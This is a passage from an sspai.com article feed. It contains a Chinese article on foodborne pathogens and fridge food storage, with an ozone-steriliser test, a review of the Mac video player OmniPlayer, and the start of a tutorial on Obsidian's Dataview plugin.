月</td>\n<td>紧张、失眠、饥饿痛、厌食、体重减轻、腹痛，有时会出现肠胃炎。</td>\n</tr>\n<tr>\n<td>肉毒杆菌及其神经毒素</td>\n<td>2 小时至 6 天 （通常为 12-36 小时）</td>\n<td>眩晕、重影或视力模糊、丧失或对光反射、吞咽困难、口干、虚弱、呼吸麻痹。</td>\n</tr>\n<tr>\n<td>旋毛虫</td>\n<td>4–28 天</td>\n<td>肠胃炎、发热、眼周水肿、出汗、肌肉疼痛、发冷、虚脱、呼吸困难。</td>\n</tr>\n<tr>\n<td>沙门氏菌</td>\n<td>7–28 天</td>\n<td>不适、头痛、发热、发热、咳嗽、恶心、呕吐、便秘、腹痛、寒战、玫瑰斑、血便。</td>\n</tr>\n<tr>\n<td>弓形虫</td>\n<td>10-13 天</td>\n<td>发热、头痛、肌痛、皮疹。</td>\n</tr>\n<tr>\n<td>单核细胞增生李斯特氏菌，空肠弯曲菌</td>\n<td>时间不定</td>\n<td>发热、发冷、头痛、关节痛、虚脱、不适、淋巴结肿大和其他相关疾病的特定症状。</td>\n</tr>\n</tbody></table></figure><h3>导致急性感染性胃肠炎的常见致病菌</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4e8hmdb34tb0h9pkil0.png\"><figcaption>图源 | <a href=\"https://www.biomerieux-industry.com/pharma-healthcare/resources/pharma-microorganisms-library/2020-03-02-prevention-and-control\" target=\"_blank\">Biomerieux</a></figcaption></figure><p>不可否认的是：肠道微生物是消化系统必不可少的部分，是构成消化系统正常生理过程的必要组成部分，但同时肠道微生物也可导致疾病的可能。人类肠道微生物群是由 35000 余种微生物共同组成的，包括细菌、真菌、古细菌、病毒等。</p>\n<p>大多数肠道微生物是非致病性的，并且与肠细胞共生共存，参与人体的营养代谢、药物代谢、预防病原微生物的定植和构成肠道屏障功能。与此同时，肠道微生物与免疫系统协同工作，发挥抵御侵入性病原微生物的功能。因此，体内肠道微生物的平衡是抵御入侵的病原微生物的一道重要防线，肠道粘膜的免疫系统扮演统筹指挥的角色，其需要保护有益的共生菌，同时防止致病微生物的生长。</p>\n<p>当肠道免疫系统受到致病肠道微生物入侵，并破防御屏障，打破胃肠道菌群平衡时，即发生急性胃肠炎的症状。当肠道免疫系统本身出现问题时，不能维持正常的肠道菌群平衡，就会导致慢性胃肠道疾病的发生。因此，肠道免疫系统遭受致病微生物的侵袭，导致正常菌群功能紊乱，保护屏障的功能破坏，是急性感染性胃肠炎的基本过程。</p>\n<h2>导致食源性疾病的原因</h2>\n<p>虽然在食品的生产、加工、运输及家庭处理的各个环节均有可能造成肠道病原微生物的污染，但家庭环境是各个环节中最常见的环节。研究表明，在国内家庭环境中，水果和蔬菜、豆类、面粉及淀粉类食物、肉类及肉制品、奶制品、海鲜是造成食源性疾病中最常见的食物——感觉包含了所有食物？这个研究就这么写的，我也很无奈。</p>\n<p>而造成食源性疾病不恰当的处理方式有：</p>\n<ol>\n<li>不彻底加热牛奶（75.6%）；</li>\n<li>外购熟食不经彻底加热（71.3%）；</li>\n<li>不经彻底加热储存在冰箱中的剩菜 (32.5%)；</li>\n<li>不将剩菜储存在冰箱中 (41.6%)。</li>\n</ol>\n<p>核心就是：保存的食物没有彻底加热。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4e8hn5b34tb0h9pkilg.png\"><figcaption>图源 | <a href=\"https://heartofamum.com/6-raw-milk-benefits-you-will-want-to-know/?__cf_chl_managed_tk__=pmd_20ddbf172abed71a9f6e247a2d6b2b98d46981e7-1628955893-0-gqNtZGzNAuKjcnBszQb6\" target=\"_blank\">Heartofamum</a></figcaption></figure><p>有意思的是，在造成食源性疾病中最常见的居然是牛奶，本身牛奶并不便宜，从侧面说明了国民生活质量的提高。正是由于价格因素及国民优异的思想品质，大多数未食用完毕的牛奶及奶制品，我们会选择冰箱保存，择日再饮。</p>\n<p>由于牛奶富含有丰富的营养，在广受人民群众喜爱的同时，对病原微生物来说也是绝佳的食物来源。保质期内、包装完好且在恰当的保存条件下，无论何种灭菌方式的牛奶，其安全性是毋庸置疑的。但是，一旦保存条件不当，则有可能造成细菌的滋生，有研究就表明：8℃ 保存的巴氏杀菌牛奶，在保质期内任一时间点的总菌落数均高于 5℃ 的保存条件。</p>\n<p>因此，一旦拆开包装或保存条件不合适，牛奶中残留的微生物会迅速滋生，导致食源性疾病的发生。不过牛奶中存在的主要致病微生物不耐热，简单的充分加热，就可以避免食源性疾病的发生，但相应的营养物质会有一定的流失。因此，建议拆开包装后一次性饮用完毕。</p>\n<h2><strong>食物的保存及烹饪</strong></h2>\n<p>由于食源性疾病最常见的因素是肠道致病微生物的滋长，保存在室温下的食物中，细菌会快速生长，所以剩菜建议在 2 小时内储存在冰箱中。除了参考食品包装上的保存建议，热处理是灭活食源性致病菌最有效策略，通常当温度 ≥90°C 且持续 &gt;90s 即可杀灭绝大多数致病菌，因此，再次食用剩菜时需要彻底加热。对厨房用具进行消毒是同样是防止微生物生长的至关重要的行为，可以降低交叉污染和/或不当储存的风险。病原微生物都喜欢营养丰富的食物，我们以牛肉和鸡蛋为例，简单介绍一下常见食物的保存和处理方式。</p>\n<p>对于新鲜牛肉，购买后建议立即将牛肉带于 4.4°C 以下冷藏，并在 3~5 天内食用。对于炒牛肉、烤牛排或快餐汉堡等完全熟制的牛肉菜肴，购买这些食品时应该是热的，且商家制作食物的流程及保存的环境足够清洁。如果室温高于 32.2°C，需要在 2 小时内食用完毕；或立即在 4.4°C 以下放入带盖的浅容器中冷藏，并在 3~4 天内食用完毕。同时记住，无论是凉菜的还是需要重新加热的菜肴，均建议加热至 73.9°C 以上再食用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4e8hndb34tb094k5620.png\"><figcaption>图源 | <a href=\"https://www.bhg.com.au/beef-rump-roast-with-creamy-greens\" target=\"_blank\">BHG</a></figcaption></figure><p>对于冷冻牛肉，处理前最好在冰箱冷藏室中缓慢、安全地解冻。碎牛肉、炖肉或牛排可在1天内解冻，带骨牛肉或整个部位的肉块可能需要 2 天或更长时间。生牛肉解冻后，在烹饪前可在冰箱中安全存放 3~5 天，在此期间，如果决定不使用牛肉，可无需先将其加热煮熟，直接回送至冷冻室即可。</p>\n<p>要在冷水中解冻的牛肉，请勿拆除包装，确保牛肉的包装密封或放入防漏袋中。将牛肉浸入冷水中，每 30 分钟换一次水，使其持续解冻，解冻后立即烹饪。如果使用微波炉解冻牛肉，因为食物局部区域可能会在微波炉中变热并煮熟，应在解冻后立即烹饪。不论何种来源的肉类，均强烈建议完全煮熟，致病微生物在未充分烹饪的肉类中是不会完全杀灭的，未完全熟制的牛肉可能会导致食源性疾病的发生。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4e8ho5b34tb0h9pkim0.png\"><figcaption>图源 | <a href=\"https://www.healthdigest.com/251722/fact-or-fiction-egg-yolks-are-bad-for-you/\" target=\"_blank\">Health Digest</a></figcaption></figure><p>鸡在 40℃ 左右下产蛋，通常是没有气囊的。随着鸡蛋冷却，会在鸡蛋的大头端形成一个气囊，是由于外壳与其内容物之间不同的收缩率而形成的，会在两个壳膜之间逐渐增大。随着时间的推移，鸡蛋的蛋白和蛋黄质量会下降，蛋黄从蛋白中吸收水分，蛋白中的水分和二氧化碳通过孔隙蒸发，使得更多空气进入外壳，气囊变大。</p>\n<p>因此，随着鸡蛋保存时间的延长，蛋黄会更扁平、更大、更容易破碎，而蛋白则会逐渐减少，鸡蛋中的系带减弱，使蛋黄偏离中心。冷藏鸡蛋可以减缓蛋白和蛋黄的损失，因此鸡蛋应该在冷藏室中保存，且在 3-5 周内食用完毕。</p>\n<h2><strong>常见抑制致病菌的处理</strong></h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4e8hodb34tb094k562g.png\"><figcaption>图源 | <a href=\"https://www.thelongestwayhome.com/blog/food-around-the-world/filipino/food-from-the-philippines-bolinao-dried-fish/\" target=\"_blank\">The Longest Way Home</a></figcaption></figure><p>中国多种美食都是在防止食物变质的处理后得出的，不论是腌制、晾晒、泡制等食物处理方式，都可以有效的减少致病微生物的生长，并增加食物的风味。但是，不论何种防变质的处理方式，都不能绝对抑制细菌的滋生。</p>\n<p>食物的酸化是抑制细菌滋生的方式之一，但例如酵母和霉菌，它们可以在极低的 pH 值下繁殖，如果不进行其它方式的消毒加工处理，仍会导致食物发酵和腐败。同时，沙门氏菌也可以在低至 3.5 的 pH 值下存活长达 27 天，如果 pH 值高于 3.5 的弱酸性环境，甚至可以存活更长时间。所以我们在此需要强调的是——对食物进行防变质处理并不能完全避免食源性疾病的发生，尤其是各家庭在处理过程中或制作工艺的不规范，在腌制、晾晒、泡制的的过程中并不能全抑制食源性细菌的生长，且有可能产生有毒物质，威胁家人的健康。</p>\n<h2>冰箱——保存食物的前线</h2>\n<p>冷藏和冷冻食物也是防止食物变质的方式之一。冷冻是保存食物十分有效的方式，可以获得长期的保存时间，在冷冻条件稳定且不改变的情况下，可认为食物长期安全，但长时间的冷冻会造成食物风味的流失，这是每一个吃货不可忽视的缺点。</p>\n<p>冷藏仍是目前我们保存食物最有效也最常用的方式，在合适的冷藏条件下，可以有效的抑制致病菌的繁殖生长，但也有部分致病菌仍可在冷藏的温度下繁殖。但许多致病菌仍可在冷藏温度下生长，如在 4 到 12°C 的温度范围内，嗜冷菌能够以低 2 到 4 倍的速度生长繁殖，可能导致食物腐败或食源性疾病的发生。因此，如何更高效的利用冷藏手段以延长食物的保存时限呢？</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4e8holb34tb0h9pkimg.png\"><figcaption>图源 | <a href=\"https://www.ncbi.nlm.nih.gov/pmc/\" target=\"_blank\">PMC</a></figcaption></figure><h3><strong>冷藏条件下常见的嗜冷细菌</strong></h3>\n<p>延长冷藏食物的保存时限，原理上就是在低温下尽可能的抑制细菌的繁殖和生长，甚至做到对食物的间断消毒。常见的消毒手段可分为物理消毒和化学消毒两种，前者主要是以高压高温为主，显然不适用于冰箱；而后者则包含各种消毒剂在内的魔法攻击，如浸泡、辐照、擦拭、消毒气体等方式，由于冰箱是封闭多层空间的环境，通过气体消毒是首选。</p>\n<p>目前在市面上广受欢迎的方式则是利用臭氧消毒，臭氧可通过简单的仪器制备，同时因 O3 分子可迅速分解成 O2，不会在食物上留下残留物，已成为现代冰箱的重要附加功能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4e8hp5b34tb0oe0vtc0.png\"><figcaption>EraClean 冰箱除味器</figcaption></figure><p>有研究表明：在短的时间内暴露于较高浓度的臭氧（10 ppm 持续 2 分钟），可显着减少大肠杆菌和李斯特菌属活菌计数，并且病原体在处理后没有显著的重新生长，且1 ppm 和 10 ppm 臭氧处理的影响没有显着差异。因此，现在已有部分冰箱将消毒功能作为推广点进行销售，但往往这类冰箱价格昂贵。针对于冰箱臭氧消毒市场，更多的是可移动式的臭氧发生器，安装简单，傻瓜式使用，关键是价格便宜（穷人不配拥有高端冰箱的凄惨故事）。</p>\n<p><strong>臭氧消毒效果</strong></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4e8hpdb34tb094k5630.png\"><figcaption>图源 | <a href=\"https://www.ncbi.nlm.nih.gov/pmc/\" target=\"_blank\">PMC</a></figcaption></figure><p>市面上的冰箱臭氧发生器都以「活性氧」为宣传重点，其实本质上就是臭氧——O3，气如其名，臭氧是臭的，毕竟放在食物旁边的东西，「臭氧」二字完全不符合高大上的气质，因此商家大多因「活性氧」代替。而真正的医学所指的「活性氧（Reactive Oxygen Species）」，是一类包括超氧化物、过氧化氢、过氧自由基和脂质过氧化物酶在内的一系列超氧化物，在人体体内参与各种生理过程，也是多年来医学的研究热点。而对于 O3 来说，大家知道就好了，不需要和商家上纲上线。</p>\n<p>为了验证臭氧在冰箱里消毒的实际效果，我从少数派获得了一款世净（EraClean CW-B01）的冰箱除味消毒器，由于本人是个强迫症，冰箱的东西都按类别摆放的，因此在正常使用冰箱的前提下，分别在 A 区（奶制品区）、B 区（剩菜区）和 C 区（鸡蛋区）分别采样做细菌培养，首次采样后开启除味消毒器 48 小时，再次在同一区域采集样品培养，结果如下：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4e8hplb34tb0b5qh9lg.png\"></figure><p>我们可以清楚观察到臭氧消毒前后的效果，尤其是 A、B 两处，菌落明显的减少，B 处在消毒前还有溶血现象的产生。A 处的细菌是最多的，一是因为此处摆放的是最具营养的牛奶，而且大部分牛奶在购买后外包装存积水分，从而有利于细菌的生长。而 C 点的鸡蛋则前后无明显差异，这是由于鸡蛋在出厂前就已经完成消毒过程，且鸡蛋在售卖、采购、储存的环节均保持了表面的干燥，不利于细菌的生存。</p>\n<p>通过实验我们可以非常直观的观察到冷藏室细菌滋生的情况，尤其是在冰箱中水分较多的区域，更是细菌的温床。因此，我们在储藏食物前应擦干净表面的水分，减少细菌的繁殖；同时，可选择购买具有臭氧消毒功能的冰箱或加装臭氧发生器，可以极大的限制冷藏室细菌的繁殖；最后，更为重要的是：应注意食物从购买、处理、加工到存储的全程冷链，根据食物不同的储藏方式，在保存限期内充分加热后再食用。</p>\n<p>做到以上三点，我们就可以大大减少急性感染性腹泻的可能，愉快的做个健康的吃货。</p>\n<h4>参考文献</h4>\n<p>Luo L, Gu Y, Wang X, et al. Epidemiological and clinical differences between sexes and pathogens in a three-year surveillance of acute infectious gastroenteritis in Shanghai. <i>Sci Rep</i>. 2019;9(1):9993. Published 2019 Jul 10. doi:10.1038/s41598-019-46480-6</p>\n<p>Bintsis T. Foodborne pathogens. <i>AIMS Microbiol</i>. 2017;3(3):529-563. Published 2017 Jun 29. doi:10.3934/microbiol.2017.3.529</p>\n<p>Jandhyala SM, Talukdar R, Subramanyam C, Vuyyuru H, Sasikala M, Nageshwar Reddy D. Role of the normal gut microbiota. <i>World J Gastroenterol</i>. 2015;21(29):8787-8803. doi:10.3748/wjg.v21.i29.8787</p>\n<p>Chen Y, Wen Y, Song J, et al. The correlation between family food handling behaviors and foodborne acute gastroenteritis: a community-oriented, population-based survey in Anhui, China. <i>BMC Public Health</i>. 2018;18(1):1290. Published 2018 Nov 26. doi:10.1186/s12889-018-6223-x</p>\n<p>United States Department of Agriculture. Food Safety Education. Available online: https: // <a href=\"http://www.fsis.usda.gov/\" target=\"_blank\">www.fsis.usda.gov</a></p>\n<p>Cho, TJ, Kim, NH, Kim, &amp; SA, et al. (2016). Survival of foodborne pathogens (escherichia coli o157:h7, salmonella typhimurium, staphylococcus aureus, listeria monocytogenes, and vibrio parahaemolyticus) in raw ready-to-eat crab marinated in soy sauce. Int J Food Microbiol.</p>\n<p>Cheng, R. M. , Churey, J. J. , &amp; Worobo, R. W. . (2018). Inactivation of salmonella enterica and spoilage microorganisms in orange juice treated with dimethyl dicarbonate (dmdc). International Journal of Food Microbiology, 285, 152-157.</p>\n<p>Russell, N. J. . (2002). Bacterial membranes: the effects of chill storage and food processing. an overview. International Journal of Food Microbiology, 79(1-2), 27-34.</p>\n<p>Kataria J, Garner LJ, Monu EA, Wang Y, Morey A. Investigating the effects of Functional Ice (FICE) on Salmonella-food safety, microbial spoilage and quality of raw poultry thigh meat during refrigerated storage. <i>PLoS One</i>. 2020;15(6):e0234781. Published 2020 Jun 19. doi:10.1371/journal.pone.0234781</p>\n<p>Wani SJ, Maker K, Thompson J, Barnes J, Singleton I. Effect of ozone treatment on inactivation of Escherichia coli and listeria sp. on spinach. <i>Agriculture</i> 2015;5:155–169.</p>\n<p>Al-Farsi M, Al-Gharibi I, Al-Abri A, et al. Evaluating the shelf-life of pasteurized milk in Oman. <i>Heliyon</i>. 2021;7(3):e06555. Published 2021 Mar 23. doi:10.1016/j.heliyon.2021.e06555</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68358"},{"title":"电视投屏、自动搜字幕、强大播放功能：Mac 全能视频播放器 OmniPlayer","date":"2021-08-18 06:43:32","description":"\n<p>一提到 Mac 上的视频播放器，我们第一反应可能就是 MPV 以及 <a href=\"https://sspai.com/post/52273\" target=\"_blank\">IINA</a> 这一类主打全格式通吃的本地视频播放器。这些视频播放器大多基于 FFmpeg 或者 VLC，在 UI 上进行了更为人性化的调整，使得我们可以在 Mac 上可以更便捷地播放各种格式的视频文件。</p>\n<p>在解决「能看」之后，我们更希望视频播放器有着一些「个性化」的功能让视频播放更为顺手，这其中的佼佼者便是今天介绍的国产 Mac 端视频播放器 OmniPlayer 。</p>\n<h2>简单易用的播放功能</h2>\n<p>和 IINA 以及 MPV 这几款主打全格式支持的 Mac 端视频播放器类似，OmniPlayer 同样也无需安装第三方解码器就可以实现各种常见音视频文件的播放，OmniPlayer 因为基于 VLC ，所以支持播放包括 MP4、MKV、RMVB、RM、AVI、MOV、WMV、FLV、WEBM、MP3、WMV 在内的多种常见视频格式，并且既可以播放保存在本地的视频，也可以通过 SMB 或者 FTP 协议来播放服务器上的视频，这尤其适合那些家中有 NAS 的用户通过专业的播放器来播放保存的视频。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4acritb34tfgga8hjn0.png\"></figure><p>播放控制方面，除了传统的播放、暂停、快进快退之外，OmniPlayer 还可以实现倍速播放，既可以直接选择预设好的 0.5 / 1.5 / 2 倍速，也可以自己设定合适的倍速，如果你经常使用 B 站的倍速功能一定能感受到这个功能的好处。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4acrj5b34tfgq1n89dg.png\"></figure><p>除了基础的视频播放之外，OmniPlayer 还可以深入对视频画面进行进一步的调整，比如说你可以调整视频的宽高比、对画面的方向进行旋转、甚至可以对画面进行水平/垂直的翻转。此外对于片源画面本身也可以调整，比如调整画面的亮度、对比度以及饱和度，在某些画面场景中可以很显著地改善观感。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4acrjdb34tfgq1n89e0.png\"></figure><p>除了视频画面之外，OmniPlayer 还可以对音频部分进行单独的调整，比如说有些片源可能存在音画不同步的情况，使用音频设置中的音频延迟可以有效地改善不同步的情况。对于多语言音轨的视频文件，你还可以选择特定音轨来进行播放，甚至你还可以像音乐播放器那样调整 EQ——事实上你也可以将 OmniPlayer 作为一款音乐播放器来使用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4acrjtb34tfv4jeusog.png\"></figure><h2>强大的字幕设置选项</h2>\n<p>如果视频没有中文字幕，OmniPlayer 也非常贴心地提供了字幕下载功能，使用起来也非常简单。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4acrk5b34tfgga8hjng.png\"></figure><p>使用 OmniPlayer 打开视频之后，在播放界面右击打开菜单，然后选择「搜索在线字幕」即可，之后 OmniPlayer 就会根据视频文件名在 <a href=\"https://www.opensubtitle.org/\" target=\"_blank\">opensubtitle.org</a> 这个字幕库网站中搜索相匹配的字幕，你可以选择相关的语言来对字幕进行筛选，之后在字幕列表中选择你认为最为匹配的字幕，点击进行下载即可。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4acrkdb34tfgq1n89eg.png\"></figure><p>将下载好的字幕保存到视频文件同目录，然后同样在播放界面右击打开菜单，选择「加载字幕」并选择刚才下载的字幕文件就可以在播放视频时同时显示匹配的字幕了，如果觉得这样操作比较麻烦也可以在 OmniPlayer 的偏好设置中找到「字幕」选项，然后勾选「播放视频时自动加载该目录下的同名字幕」来实现视频播放时的字幕自动加载。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4acrklb34tfgq1n89f0.png\"></figure><p>我们还可以在 OmniPlayer 中对字幕进行一系列的设置，比如默认字幕是白色，在某些视频的某些画面上可能观感不佳，这里我们可以在设置中我们调整字幕的颜色、文本大小，甚至还可以调整字符编码；对于部分字幕时间轴和视频无法匹配从而造成的字幕和音频不同步，通过设置中调整字幕的延迟时间也可以轻松解决。</p>\n<h2>将视频投到电视上看</h2>\n<p>OmniPlayer 还有一项非常实用的功能就是可以将当前的视频投屏到电视上去，这样就不需要在电视上安装软件，通过相关的协议就可以直接看 Mac 上的视频。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c4acrktb34tfgga8hjo0.png\"></figure><p>要想将视频「投屏」到电视其实操作上也并不复杂：打开 OmniPlayer 并在系统菜单栏中找到 OmniPlayer 图标，点击选择你想要投屏的设备即可。</p>\n<p>经过我的测试，即便是封装成 MKV 格式的视频文件，也可以无需视频转换即可实现投屏，音频轨道也可以在电视端顺利播放。由于目前大部分的电视都支持 DLNA，因此基本上都可以实现投屏（部分智能电视会同时启动投屏助手），甚至还支持 XBOX 游戏机以及 ChromeCast 设备。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4acrl5b34tfgq1n89fg.png\"></figure><p>投屏到电视后，我们还可以在 Mac 端为投屏的视频调整字幕以及音轨，你可以选择不同的字幕文件加载到投屏的视频中，也可以切换视频中不同的音轨。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4acrldb34tfgdh4vpqg.png\"></figure><h2>生成视频信息</h2>\n<p>除了观看视频，OmniPlayer 还可以生成一系列的视频信息，比如视频缩略图可以快速地了解视频的大致内容，只需要在播放视频的时候点击视频窗口左边的生成视频缩略图按钮即可，效果如下图：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4acrllb34tfv4jeusp0.jpeg\"></figure><p>当然除了生成当前视频的缩略图之外，OmniPlayer 还可以针对当前视频实现快速的截图和录屏，截屏上操作也是在当前播放的视频窗口，点击右上角的截屏按钮就可以截取当前时间的视频帧并保存为图片文件。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4acrltb34tfgdh4vpr0.png\"></figure><p>录屏既可以录制为视频文件，也可以制作 GIF 动图，其中制作动图是通过点击当前视频播放窗口的右侧的 GIF 按钮，第一次点击开始记录，并以一秒一帧的速度开始录制，再次点击 GIF 按钮则完成录制。录制方式简单，但并不能调整 GIF 录制的参数（比如画面大小、帧数等）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4acrm5b34tfgq1n89g0.png\"></figure><p>最后是录制视频片段，相比 GIF 录制，视频片段的录制可以看到片段对应的时间轴，录制方式也很直观——点击视频播放窗口的画面右侧，在弹出的录制视频的信息框中看到视频对应的时间轴，之后拖动下方的进度条来控制需要截取视频的开头和结尾时间，点击保存即可。你甚至可以选择让截取的视频中嵌入相应的字幕。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4acrmlb34tfgdh4vprg.png\"></figure><h2>结语</h2>\n<p>总的来说，OmniPlayer 是一款在 Mac 上非常全面的视频播放器，基于 VLC 通吃几乎所有的视频格式，此外还针对性地加入了相当多的使用功能，尤其是字幕上的一键下载以及投屏到电视等功能，让视频播放变得更为简单，如果你有在 Mac 上看本地视频的需求，不妨试试这款颇具特点的播放器 App。</p>\n<p><strong>编注：</strong>OmniPlayer 已上架少数派，应用支持 macOS 平台，永久会员售价 60 元，你可以在 <a href=\"https://sspai.com/item/277\" target=\"_blank\">少数派网站</a> 或 <a href=\"https://item.taobao.com/item.htm?id=652724584896\" target=\"_blank\">少数派正版软件淘宝店</a> 进行获取。</p>\n<span class=\"ss-genuineSoftware\" product-id=\"277\" type=\"genuineSoftware\"> </span><span class=\"ss-externalProduct\" title=\"OmniPlayer\" type=\"externalProduct\" link=\"https://item.taobao.com/item.htm?id=652724584896\" through-price=\"\" price=\"60\" cover=\"https://cdn.sspai.com/2021/08/18/3b691b7d9fd4ef3062d8243c445dde35.png\" description=\"前往少数派正版软件淘宝店购买\" date-start=\"\" date-end=\"\"> </span><p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68234"},{"title":"快速聚合 Obsidian 笔记，试试用 Dataview 生成目录","date":"2021-08-18 03:30:05","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>距离上次发布 Obsidian 使用类的文章已经一个月了，这段时间大家过得怎么样？有把 Obsidian 用起来吗？</p>\n<p>这篇仍然是使用类干货，当你积累了 10+ 篇自己的笔记，或许会需要它，先来看看它的使用场景。</p>\n<h2>使用场景</h2>\n<p>假设你现在积累了一众笔记，这些笔记之间除了双链还有一些关联，现在你想要一个目录，可以一目了然的聚合这些笔记。</p>\n<p>以下是一些场景：</p>\n<ul>\n<li>生成 <strong>包含同样关键字的笔记 </strong>的目录</li>\n<li>生成 <strong>同一个标签的笔记 </strong>的目录</li>\n<li>生成 <strong>同一个作者的书目 </strong>的目录</li>\n</ul>\n<p>这时候，Dataview 就派上用场了。</p>\n<p>Dataview 可以生成 MOC，或者你也可以跟我一样，不去管 MOC 是什么，就把它当作一个目录。</p>\n<p>我们知道，目录是一篇文章的概览。<strong>Dataview 其实生成了你的多篇文章目录</strong>。</p>\n<p>如果你有这种需要的话，就接着看下去吧。</p>\n<h2>安装插件</h2>\n<p>众所周知（如果你不知道，现在可以知道了），ob 插件有两种安装方式：</p>\n<ol>\n<li>直接在 <code>第三方插件-&gt;社区插件 </code>搜索安装</li>\n<li>下载到插件文件，一般是一个插件文件夹，然后放在库目录下的 <code>.Obsidian/plugins</code> 目录下。（至于从哪里下载，可以从 github 或者有些群会下载下来共享）</li>\n</ol>\n<p><strong>设置 </strong>：该插件不需要修改任何设置即可使用。</p>\n<p>接下来就开始生成目录吧！</p>\n<h2>使用</h2>\n<p>方法千千万，我只写三种生成目录的方式：</p>\n<ul>\n<li>从名字</li>\n<li>从作者</li>\n<li>从标签</li>\n</ul>\n<p>如果有更多的需求，说明你是个高阶使用者，请去查看更高阶的文章，或者去看插件作者的官网。</p>\n<h3>从文件名</h3>\n<p>场景：假设，现在你有多篇关于【习惯】的笔记，并且这些笔记的 <strong>名称中都有 「习惯」 两个字 </strong>。记录了好几个习惯养成的方法，今天你忽然意识到，关于习惯的方法论已经看了好几个了，想把它们列出来放到一起看看能不能产生什么化学效果。</p>\n<p>老规矩，先贴一个语法和效果图：<br> </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://i.loli.net/2021/08/08/qFhjgzCyNfoUcOV.png\" alt=\"\"></figure><p>下面讲讲规则，别害怕看「代码」，总共就 5 行，大部分还是不用改的，比如我上面的代码，其实你只用替换双引号里面的内容哟，是不是简单多了？</p>\n<p>首先，dv 语法要写到代码块里，如果有了解过 Markdown 的小伙伴，应该对代码块不陌生。上下三个上撇，就是一个代码块。</p>\n<p>在首行写上 <code>Dataview</code>，插件就可以识别这部分代码了。</p>\n<figure class=\"table\"><table>\n<thead><tr>\n<th>设置字段</th>\n<th>释义</th>\n<th>必要与否</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>list</td>\n<td>展现形式。创建列表，还有 table、task 可以选择</td>\n<td>必要</td>\n</tr>\n<tr>\n<td>from</td>\n<td>检索范围。从哪个文件夹（写在双引号里面），或者标签（写在#后面）</td>\n<td>非必要</td>\n</tr>\n<tr>\n<td>where</td>\n<td>聚合条件。contains(file.name,\"Dataview\") 就是匹配文件名为 “Dataview” 的文件</td>\n<td>非必要</td>\n</tr>\n<tr>\n<td>sort</td>\n<td>排序，根据什么做排序。 <code>sort file.ctime</code> 就是根据文件的创建时间正序</td>\n<td>非必要</td>\n</tr>\n</tbody>\n</table></figure><p>以上解释希望你看懂了。下面我举一个例子，还以开头的假设场景为例，你要怎么写呢？</p>\n<pre class=\"language-null\"><code>```Dataview\nlist \nfrom \"\"\nwhere contains(file.name,\" 习惯 \")\n```</code></pre>\n<p>这样就可以了。</p>\n<ul>\n<li>list：你创建了一个列表 / 清单。</li>\n<li>from：留空就是不筛选文件夹和标签，从所有笔记文件去找。</li>\n<li>where 条件：匹配（contains）了文件名（file.name）中包含「习惯」两个字的笔记</li>\n</ul>\n<p>如果你需要排序，就写 sort，不需要，留空就可以。</p>\n<p>你应该发现了 <code>file.name</code> 和 <code>file.ctime</code> 的写法，没错，这是 Dataview 内置的。下面是 Dataview 官网中描述的支持的元数据，都可以供搜索和排序语法使用。在后面将要说到的创建 table，还可以作为列显示。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://i.loli.net/2021/08/08/7JDtQ6MczTY3nxl.png\" alt=\"\"></figure><p>上面的从文件名创建列表你看懂了的话，用从标签创建列表练习一下吧～其实上面有包含哦，但我们还是练习以下，以防有人没看懂。</p>\n<h3>从标签</h3>\n<p>场景：假设，你有几篇笔记，打了同一个标签，比如 